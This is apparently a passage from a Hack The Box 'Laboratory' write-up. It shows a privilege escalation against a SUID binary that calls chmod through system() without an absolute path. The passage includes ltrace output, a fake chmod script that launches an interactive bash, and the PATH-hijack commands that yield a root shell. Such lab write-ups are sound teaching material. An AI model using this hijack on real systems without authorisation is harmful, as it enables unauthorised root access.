# 20-Privesc

Look at the SUID binaries ![](https://github.com/quangtien0101/HTB_Laboratory/tree/61be6c501b6c846246628c926fa3d7dcd963be87/Laboratory/Screen-shot/SUID%20docker-security.png)

The binary is owned by `dexter` and we can executed as `root`

## ltrace

```bash
dexter@laboratory:~$ ltrace /usr/local/bin/docker-security
setuid(0)                                                                                                            = -1
setgid(0)                                                                                                            = -1
system("chmod 700 /usr/bin/docker"chmod: changing permissions of '/usr/bin/docker': Operation not permitted
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                               = 256
system("chmod 660 /var/run/docker.sock"chmod: changing permissions of '/var/run/docker.sock': Operation not permitted
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                               = 256
+++ exited (status 0) +++
```

We see that once we are root, we can hijack the `chmod` binary since it doesn't use the absolute path

create a `chmod` executable which essentially start a `bash` shell

```bash
#!/bin/bash
echo "chmod hijack"
bash -i
```

```bash
dexter@laboratory:/dev/shm$ vi chmod
dexter@laboratory:/dev/shm$ chmod +x chmod 
dexter@laboratory:/dev/shm$ export PATH=$(pwd):$PATH
dexter@laboratory:/dev/shm$ /usr/local/bin/docker-security
chmod hijack
root@laboratory:/dev/shm# cat chmod
```

![](https://github.com/quangtien0101/HTB_Laboratory/tree/61be6c501b6c846246628c926fa3d7dcd963be87/Laboratory/Screen-shot/Gain%20root.png)

